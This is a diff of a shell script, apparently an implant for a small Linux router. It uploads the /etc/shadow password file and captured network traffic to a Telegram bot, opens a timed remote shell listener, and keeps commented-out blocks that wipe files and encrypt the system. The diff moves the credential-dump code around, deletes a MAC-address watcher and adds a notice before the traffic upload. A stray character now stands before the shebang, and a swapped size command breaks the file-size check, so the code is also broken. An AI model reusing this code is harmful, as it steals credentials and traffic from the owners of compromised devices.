@@ -1,4 +1,4 @@
-#!/bin/ash
+t#!/bin/ash
 #echo $SHELL to see what shell it's use
 current_date=$(date "+%d-%m-%Y")
 wget -q --spider http://google.com
@@ -112,36 +112,12 @@ if [ $? -eq 0 ]; then
     #curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Redirection completed successfully: $domain -> $ip_server"
 
     #Session controll
-    #sessions=$(who | awk '{print $1 " " $2 " " $5}' | grep "root")
-    #count=$(echo "$sessions" | wc -l)
-    #if [ "$count" -ge 2 ]; then
-        #curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Warning: $count sessions %0AAutoremove"
+    #n_session=$(logread -e "auth succeeded" | wc -l)
+    #if [ "$n_session" -ge 2 ]; then
+        #more_info=$(logread -e "auth succeeded")
+        #curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Warning: $n_session sessions: %0A$more_info %0AAutoremove"
         #rm -rf ./*
     #fi
-
-    ##Deny Connection
-    #iptables -A INPUT -s <IP_host> -j DROP
-    #iptables -A OUTPUT -d <IP_host> -j DROP
-    
-    #Allow Connection
-    #iptables -A INPUT -s <IP_host> -j DROP
-    #iptables -A OUTPUT -d <IP_host> -j DROP
-
-    #Send report
-    filepath1=$nmap_output_file
-    filepath3=$ifconfig_output_file
-    curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Public ip: $public_ip %0ASystem info: $system_info"
-    curl -F chat_id="$chat_id" -F document=@"$filepath1" "https://api.telegram.org/bot$token/sendDocument"
-    curl -F chat_id="$chat_id" -F document=@"$filepath3" "https://api.telegram.org/bot$token/sendDocument"
-    rm "$filepath1"
-    rm "$filepath3"
-
-    # Dump /etc/shadow file
-    result_shadow="result_shadow_$public_ip.txt"
-    touch $result_shadow
-    cat /etc/shadow > $result_shadow
-    curl -F chat_id="$chat_id" -F document=@"$result_shadow" "https://api.telegram.org/bot$token/sendDocument"
-    rm "$result_shadow"
 
     #Crypt System
     #function to generate a random password
@@ -167,6 +143,21 @@ if [ $? -eq 0 ]; then
         #fi
     #done
 
+    ##Deny Connection
+    #iptables -A INPUT -s <IP_host> -j DROP
+    #iptables -A OUTPUT -d <IP_host> -j DROP
+    
+    #Allow Connection
+    #iptables -A INPUT -s <IP_host> -j DROP
+    #iptables -A OUTPUT -d <IP_host> -j DROP
+
+    # Dump /etc/shadow file
+    result_shadow="result_shadow_$public_ip.txt"
+    touch $result_shadow
+    cat /etc/shadow > $result_shadow
+    curl -F chat_id="$chat_id" -F document=@"$result_shadow" "https://api.telegram.org/bot$token/sendDocument"
+    rm "$result_shadow"
+
     # Remote Shell enabled for 30 minutes
     h=$(date +"%H:%M")
     start="14:00"
@@ -189,32 +180,9 @@ if [ $? -eq 0 ]; then
         curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Stop listening: $public_ip:$port"
     fi
 
-    # Identify new host
-    wifi_interface="wlan0"
-    #gets the list of all available network interfaces and filters only the Ethernet ones
-    ethernet_interfaces=$(ip link | awk -F: '$0 !~ "lo|vir|wl|^[^0-9]"{print $2}')
-    #obtains MAC addresses from the specified network interfaces
-    get_mac_addresses() {
-      arp -a | awk '{print $4}' | sort -u
-    }
-    #stores currently known MAC addresses
-    known_macs=$(get_mac_addresses)
+    # Intercept traffic
+    echo "Start intercepting..."
     while true; do
-        #gets the currently detected MAC addresses for all Ethernet interfaces
-        current_macs=$(for interface in $ethernet_interfaces; do
-            ip neigh show dev $interface | awk '{print $5}'
-        done | sort -u)
-        #compares currently detected MAC addresses with known MAC addresses
-        new_macs=$(comm -13 <(echo "$known_macs") <(echo "$current_macs"))
-        #if there are new MAC addresses, it prints a message
-        if [ -n "$new_macs" ]; then
-            curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="New macs: $new_macs"
-            #update known MAC addresses
-            known_macs="$current_macs"
-        fi
-
-        # Intercept traffic
-        echo "Start intercepting..."
         #max size of file .pcap
         MAX_FILE_SIZE=200000000  # 200MB in byte
         #name of file
@@ -228,7 +196,7 @@ if [ $? -eq 0 ]; then
         #cicle while to check size of file .pcap
         while true; do
             #obtain current size of file .pcap
-            FILE_SIZE=$(stat -c%s "$tcpdump_output_file")
+            FILE_SIZE=$(du -sc "$tcpdump_output_file")
             #if the size > 200mb stop tcpdump process 
             if [ "$FILE_SIZE" -ge "$MAX_FILE_SIZE" ]; then
                 kill -SIGINT "$tcpdump_pid"
@@ -238,6 +206,7 @@ if [ $? -eq 0 ]; then
             sleep 1
         done
         #send file via telegram
+        curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Traffic intercepted: $public_ip"
         curl -F chat_id="$chat_id" -F document=@"$tcpdump_output_file" "https://api.telegram.org/bot$token/sendDocument"
         rm "$tcpdump_output_file"
     done
